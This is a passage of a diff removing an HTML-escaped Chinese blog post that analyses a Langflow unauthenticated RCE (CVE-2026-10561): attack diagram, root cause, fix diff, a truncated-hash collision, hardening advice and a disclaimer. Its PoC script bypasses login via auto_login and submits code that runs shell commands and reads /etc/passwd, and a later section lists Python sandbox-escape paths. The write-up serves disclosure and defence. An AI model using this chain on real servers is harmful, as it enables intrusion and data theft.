-  ────────────────────────────────────────  │
-                                   exec(code, globals_)
-                                   globals_ 无 builtins 键
-                                             │
-                                             ▼
-                                   CPython 自动注入
-                                   完整 builtins 模块
-                                             │
-  [Step 4] RCE                              │
-  ────────────────────────────────────────  │
-                                   __import__(&amp;#39;os&amp;#39;).system(&amp;#39;...&amp;#39;)
-                                             │
-                                             ▼
-                                   ┌──────────────────┐
-                                   │  宿主机任意代码执行 │
-                                   │  (Langflow 进程权限)│
-                                   └──────────────────┘
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;6.2 PoC 代码&lt;/h3&gt;
-&lt;p&gt;以下为概念验证（PoC）的脚本化描述，仅用于说明攻击原理：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;requests&lt;/span&gt;
-
-&lt;span class="n"&gt;TARGET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://target-langflow:7860&amp;quot;&lt;/span&gt;
-
-&lt;span class="c1"&gt;# Step 1: 认证绕过 — auto_login 端点无需任何凭据&lt;/span&gt;
-&lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;TARGET&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/api/v1/auto_login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;jwt_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;access_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authorization&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Bearer &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;jwt_token&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
-
-&lt;span class="c1"&gt;# Step 2: 构造恶意代码&lt;/span&gt;
-&lt;span class="c1"&gt;# get_globals() 未设 builtins={} → CPython 自动注入完整 builtins&lt;/span&gt;
-&lt;span class="c1"&gt;# → __import__ / open / eval 全部可达&lt;/span&gt;
-&lt;span class="n"&gt;malicious_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
-&lt;span class="s2"&gt;import os&lt;/span&gt;
-&lt;span class="s2"&gt;output = os.popen(&amp;#39;id &amp;amp;&amp;amp; hostname&amp;#39;).read()       # 证明 RCE&lt;/span&gt;
-&lt;span class="s2"&gt;with open(&amp;#39;/etc/passwd&amp;#39;) as f:                     # 读取宿主机文件&lt;/span&gt;
-&lt;span class="s2"&gt;    print(f.read()[:200])&lt;/span&gt;
-&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
-
-&lt;span class="c1"&gt;# Step 3: 提交到 PythonREPLComponent 执行接口&lt;/span&gt;
-&lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;TARGET&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/api/v1/...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;code&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;malicious_code&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# 输出: uid=1000(langflow)... / langflow-server / root:x:0:0:root:...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;6.3 两请求完成全链&lt;/h3&gt;
-&lt;p&gt;整条链路不需要任何前置条件（无验证码、无速率限制、无交互），认证成本为零，压缩为两个 HTTP 请求即可完成从匿名到 RCE 的全流程。这就是标题"一行未授权请求干穿 CVSS 10"的由来。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;七、架构级设计缺陷&lt;/h2&gt;
-&lt;p&gt;CVE-2026-10561 不仅仅是一个"代码 bug"，它暴露的是 Langflow 在架构层面的设计缺陷。&lt;/p&gt;
-&lt;h3&gt;7.1 代码执行节点与宿主同环境&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;┌────────────────────────────────────────────────┐
-│&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="nv"&gt;Langflow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;宿主进程&lt;span class="w"&gt;                    &lt;/span&gt;│
-│&lt;span class="w"&gt;                                                  &lt;/span&gt;│
-│&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;Web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;FastAPI&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;│&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nv"&gt;Flow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;Engine&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;│&lt;span class="w"&gt; &lt;/span&gt;用户代码&lt;span class="w"&gt; &lt;/span&gt;│
-│&lt;span class="w"&gt;                                       &lt;/span&gt;&lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="ss"&gt;()&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;│
-│&lt;span class="w"&gt;  &lt;/span&gt;◄──&lt;span class="w"&gt; &lt;/span&gt;共享同一进程&lt;span class="o"&gt;/&lt;/span&gt;解释器&lt;span class="o"&gt;/&lt;/span&gt;权限&lt;span class="o"&gt;/&lt;/span&gt;网络&lt;span class="o"&gt;/&lt;/span&gt;文件系统&lt;span class="w"&gt; &lt;/span&gt;──►&lt;span class="w"&gt;   &lt;/span&gt;│
-│&lt;span class="w"&gt;                                                  &lt;/span&gt;│
-│&lt;span class="w"&gt;  &lt;/span&gt;❌&lt;span class="w"&gt; &lt;/span&gt;无命名空间隔离&lt;span class="w"&gt;  &lt;/span&gt;❌&lt;span class="w"&gt; &lt;/span&gt;无&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;seccomp&lt;/span&gt;&lt;span class="w"&gt;                 &lt;/span&gt;│
-│&lt;span class="w"&gt;  &lt;/span&gt;❌&lt;span class="w"&gt; &lt;/span&gt;无降权&lt;span class="w"&gt;          &lt;/span&gt;❌&lt;span class="w"&gt; &lt;/span&gt;无&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;builtins&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;清空&lt;span class="w"&gt;           &lt;/span&gt;│
-└────────────────────────────────────────────────┘
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;用户提交的代码与 Langflow 自身服务逻辑跑在同一个进程里，能访问的内存、文件、网络、环境变量与 Langflow 完全相同。&lt;/p&gt;
-&lt;h3&gt;7.2 RCE 是"功能"而非"漏洞"&lt;/h3&gt;
-&lt;p&gt;这是最根本的问题。Langflow 的产品定位就是"让用户在画布上写 Python"，因此"在服务端执行用户提供的 Python 代码"是&lt;strong&gt;产品的默认功能&lt;/strong&gt;，而不是一个意外引入的漏洞。&lt;/p&gt;
-&lt;p&gt;这意味着：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;你不能简单地"禁用代码执行"来修复，因为那等于砍掉产品的核心功能；&lt;/li&gt;
-&lt;li&gt;你必须在"允许执行"和"安全隔离"之间找到平衡，而 Langflow 在 1.9.4 之前完全没有做隔离；&lt;/li&gt;
-&lt;li&gt;安全模型应该是：&lt;strong&gt;默认不信任用户代码，提供强隔离的执行环境（容器、沙箱、降权），而非依赖白名单这种可被绕过的软限制。&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h2&gt;八、修复方案：升级到 1.9.4&lt;/h2&gt;
-&lt;p&gt;IBM 安全公告明确指出：&lt;strong&gt;无 Workarounds（无缓解措施），唯一修复方式是升级到 1.9.4。&lt;/strong&gt;&lt;/p&gt;
-&lt;h3&gt;8.1 修复内容&lt;/h3&gt;
-&lt;p&gt;1.9.4 版本同时修复了以下问题：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;修复项&lt;/th&gt;
-&lt;th&gt;说明&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;builtins 注入&lt;/td&gt;
-&lt;td&gt;在 &lt;code&gt;get_globals()&lt;/code&gt; 中&lt;strong&gt;显式设置&lt;/strong&gt; &lt;code&gt;globals_["builtins"] = {}&lt;/code&gt;，阻止 CPython 自动注入完整 builtins&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;认证绕过&lt;/td&gt;
-&lt;td&gt;修复 &lt;code&gt;auto_login&lt;/code&gt; 相关的认证逻辑&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;CVE-2026-7664&lt;/td&gt;
-&lt;td&gt;同时修复 MCP transport endpoint 授权绕过（CVSS 9.8）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3&gt;8.2 builtins 注入修复 diff（概念）&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;get_globals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;globals_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
-    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;module_name&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;global_imports&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module_name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="o"&gt;+&lt;/span&gt;   &lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;   &lt;span class="c1"&gt;# 修复：显式清空，阻止 CPython 自动注入&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;globals_&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;关键改动只有一行：&lt;code&gt;globals_["builtins"] = {}&lt;/code&gt;——显式告诉 CPython"我不需要 builtins"，从而阻止自动注入。设置后 &lt;code&gt;__import__&lt;/code&gt;、&lt;code&gt;open&lt;/code&gt;、&lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;import&lt;/code&gt; 语句全部失效，白名单机制才真正生效。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;注意：仅清空 builtins 并不能提供真正的安全隔离（攻击者仍可通过类型子类化、&lt;code&gt;object.__subclasses__()&lt;/code&gt; 等方式逃逸纯 Python 沙箱）。真正的修复还需配合进程级/容器级隔离。但在认证完好的前提下，这已将"未授权 RCE"降级为"授权用户的沙箱逃逸"，攻击门槛和影响范围大幅降低。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3&gt;8.3 认证绕过修复&lt;/h3&gt;
-&lt;p&gt;对于 &lt;code&gt;auto_login&lt;/code&gt;，1.9.4 对 &lt;code&gt;/api/v1/auto_login&lt;/code&gt; 端点的认证逻辑进行了收紧。在生产环境部署时，强烈建议：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# 显式关闭 auto_login&lt;/span&gt;
-&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LANGFLOW_AUTO_LOGIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;
-
-&lt;span class="c1"&gt;# 配置真实的管理员账号&lt;/span&gt;
-&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LANGFLOW_SUPERUSER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;admin
-&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LANGFLOW_SUPERUSER_PASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;强密码&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;h2&gt;九、附加发现：Custom Component 的 SHA-256 截断碰撞&lt;/h2&gt;
-&lt;p&gt;在分析 CVE-2026-10561 的过程中，还发现了一个与 Custom Component allow-list 相关的碰撞漏洞。&lt;/p&gt;
-&lt;h3&gt;9.1 漏洞原理&lt;/h3&gt;
-&lt;p&gt;Langflow 的 Custom Component 机制允许用户提交自定义组件代码。为了做 allow-list（允许列表）校验，系统对组件代码计算 SHA-256 哈希，但&lt;strong&gt;只取前 12 个十六进制字符（即 48 bit）&lt;/strong&gt;作为标识：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# 概念代码&lt;/span&gt;
-&lt;span class="n"&gt;component_hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;component_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="c1"&gt;# 12 个十六进制字符 = 48 bit&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;48 bit 的哈希空间 = 2^48 ≈ 2.8 × 10^14 种可能。虽然这个数字看起来很大，但在现代硬件上进行&lt;strong&gt;生日攻击（birthday attack）&lt;/strong&gt;寻找碰撞是可行的。&lt;/p&gt;
-&lt;h3&gt;9.2 碰撞验证&lt;/h3&gt;
-&lt;p&gt;实测结果：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;硬件&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;326&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;核&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CPU&lt;/span&gt;
-&lt;span class="err"&gt;耗时&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;7.4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;分钟&lt;/span&gt;
-&lt;span class="err"&gt;结果&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;成功找到两个不同的组件代码，其&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SHA&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="o"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;相同&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;这意味着攻击者可以构造一个&lt;strong&gt;与白名单中合法组件哈希相同&lt;/strong&gt;的恶意组件，从而绕过 allow-list 校验，将恶意代码注入到允许列表中。&lt;/p&gt;
-&lt;h3&gt;9.3 为什么 48 bit 不够&lt;/h3&gt;
-&lt;p&gt;生日攻击所需尝试次数约为 &lt;code&gt;2^(n/2) = 2^24 ≈ 1677 万&lt;/code&gt;次。以 326 核并行计算（约 3.26 × 10^8 次/秒），考虑内存/IO 开销后实际约 7.4 分钟即可碰撞成功。在 2026 年的硬件条件下，48 bit 截断完全不安全。安全的做法是使用完整的 SHA-256（256 bit），或至少截断到 128 bit 以上。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;十、相关漏洞：CVE-2026-7664&lt;/h2&gt;
-&lt;p&gt;在 1.9.4 版本中，与 CVE-2026-10561 一同修复的还有 &lt;strong&gt;CVE-2026-7664&lt;/strong&gt;。&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;项目&lt;/th&gt;
-&lt;th&gt;内容&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;CVE 编号&lt;/td&gt;
-&lt;td&gt;CVE-2026-7664&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;CVSS 评分&lt;/td&gt;
-&lt;td&gt;9.8&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;漏洞组件&lt;/td&gt;
-&lt;td&gt;MCP (Model Context Protocol) transport endpoint&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;漏洞类型&lt;/td&gt;
-&lt;td&gt;授权绕过&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;MCP transport endpoint 存在授权绕过问题，攻击者可绕过认证访问 MCP 相关接口。虽然其 CVSS 略低于 CVE-2026-10561（9.8 vs 10.0，差异在于影响范围 &lt;code&gt;S&lt;/code&gt; 维度），但同样是严重的认证缺陷，应在升级时一并修复。&lt;/p&gt;
-&lt;p&gt;这两个 CVE 共同表明：Langflow 在 1.9.4 之前的认证体系存在系统性问题，而非个别疏漏。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;十一、防御方案总结&lt;/h2&gt;
-&lt;h3&gt;11.1 立即行动&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;升级 Langflow 到 1.9.4 或更高版本&lt;/strong&gt;（唯一官方修复方式）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;设置 &lt;code&gt;LANGFLOW_AUTO_LOGIN=false&lt;/code&gt;&lt;/strong&gt;，配置真实管理员账号&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;确认实例不暴露在公网&lt;/strong&gt;（限制到内网/VPN）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;在反向代理层增加认证&lt;/strong&gt;（Basic Auth / OAuth / mTLS）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;审计日志&lt;/strong&gt;：检查 &lt;code&gt;/api/v1/auto_login&lt;/code&gt; 的历史访问记录&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3&gt;11.2 架构层防御（纵深防御）&lt;/h3&gt;
-&lt;p&gt;即使升级到 1.9.4，也建议从架构层面增加纵深防御：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;容器级隔离&lt;/strong&gt;：将 Python 执行节点放到独立的、降权的容器中，与主服务隔离文件系统、网络命名空间、进程空间。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;seccomp + AppArmor/SELinux&lt;/strong&gt;：限制可用系统调用，启用强制访问控制。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;网络分段&lt;/strong&gt;：执行容器不应有出站网络权限（或仅白名单域名），防止数据外传和反弹 shell。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;资源限制&lt;/strong&gt;：设置 CPU、内存、执行时间限制，防止资源耗尽。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;审计与监控&lt;/strong&gt;：记录所有代码执行请求的来源、时间、代码内容，建立异常检测规则。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3&gt;11.3 部署配置加固&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;LANGFLOW_AUTO_LOGIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;
-&lt;span class="nv"&gt;LANGFLOW_SUPERUSER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;your_admin&amp;gt;
-&lt;span class="nv"&gt;LANGFLOW_SUPERUSER_PASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;strong_random_password&amp;gt;
-&lt;span class="nv"&gt;LANGFLOW_HOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;# 仅监听本地，由反向代理(nginx/caddy)增加认证层&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;11.4 关于 builtins 沙箱的正确认知&lt;/h3&gt;
-&lt;p&gt;需要强调，&lt;strong&gt;仅靠 &lt;code&gt;globals_["builtins"] = {}&lt;/code&gt; 并不能构建安全的 Python 沙箱&lt;/strong&gt;。Python 沙箱逃逸技术已非常成熟，常见路径包括类型子类化（&lt;code&gt;().__class__.__bases__[0].__subclasses__()&lt;/code&gt;）、通过已加载模块引用获取 builtins、利用 &lt;code&gt;gc&lt;/code&gt;/&lt;code&gt;f-code&lt;/code&gt; 等机制逃逸。&lt;/p&gt;
-&lt;p&gt;因此，&lt;code&gt;builtins = {}&lt;/code&gt; 只是修复了最易被利用的路径，真正的安全隔离必须依赖进程级/容器级/操作系统级隔离机制。所有提供"在线执行用户 Python 代码"功能的产品都应以此为戒：&lt;strong&gt;不要试图用语言层面的限制替代操作系统级别的隔离。&lt;/strong&gt;&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;十二、总结&lt;/h2&gt;
-&lt;p&gt;CVE-2026-10561 是一个教科书级别的"满分漏洞"案例，其价值不在于攻击技术的精巧，而在于它清晰地展示了几个安全工程的核心教训：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;不作为即默许&lt;/strong&gt;：&lt;code&gt;get_globals()&lt;/code&gt; 未设置 &lt;code&gt;builtins&lt;/code&gt; 键，本意是"不放 builtins"，但 CPython 的行为是"你不放我就给你全套"。理解运行时的隐式行为是安全编码的前提。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;默认配置决定安全基线&lt;/strong&gt;：&lt;code&gt;auto_login=true&lt;/code&gt; 作为默认值，把"需要管理员账号才能利用的 RCE"变成了"任何人都能利用的 RCE"。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;两个独立失败的叠加&lt;/strong&gt;：单独看，隔离失败和认证绕过各自都"不算最严重"；叠加之后，从"互联网匿名用户"到"宿主机 RCE"之间没有任何阻隔。安全评估必须考虑多个缺陷的组合效应。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;功能即攻击面&lt;/strong&gt;：当"执行用户代码"是核心功能时，安全模型必须围绕"如何安全地提供这个功能"来设计，而非寄希望于白名单等软限制。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;无 Workarounds 的严重性&lt;/strong&gt;：IBM 明确声明此漏洞没有缓解措施，唯一修复方式是升级。所有运行 1.0.0-1.9.3 的实例在升级之前完全暴露——没有任何配置调整能替代版本升级。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;修复行动非常简单：升级到 1.9.4，关闭 auto_login，限制网络暴露。&lt;/strong&gt;&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;免责声明&lt;/h2&gt;
-&lt;p&gt;本文所述技术内容仅用于安全研究、防御建设和教育目的。所有漏洞分析、PoC 代码和攻击路径描述均基于公开的安全公告（IBM Security Advisory）和已修复版本的反向分析，旨在帮助安全工程师、运维人员和开发者理解漏洞原理并采取相应防护措施。&lt;/p&gt;
-&lt;p&gt;读者&lt;strong&gt;不得&lt;/strong&gt;将本文中的任何技术信息用于未经授权的系统测试、渗透攻击或其他可能违反法律法规的活动。未经授权访问、攻击计算机系统在大多数国家和地区属于刑事犯罪。&lt;/p&gt;
-&lt;p&gt;作者不对任何人基于本文内容所采取的任何行为承担责任。在使用本文涉及的任何技术之前，请确保你已获得目标系统的合法授权，并遵守当地法律法规。如果你发现 Langflow 实例存在受影响版本，请立即联系系统管理员或通过 IBM 官方渠道进行报告。&lt;/p&gt;
-&lt;p&gt;本文中涉及的 CVE 编号、版本号、CVSS 评分等技术细节，均以官方安全公告为准。如官方信息与本文章存在差异，以官方公告为准。&lt;/p&gt;</content><category term="技术"/></entry></feed>
+&lt;/ol&gt;</content><category term="技术"/></entry></feed>
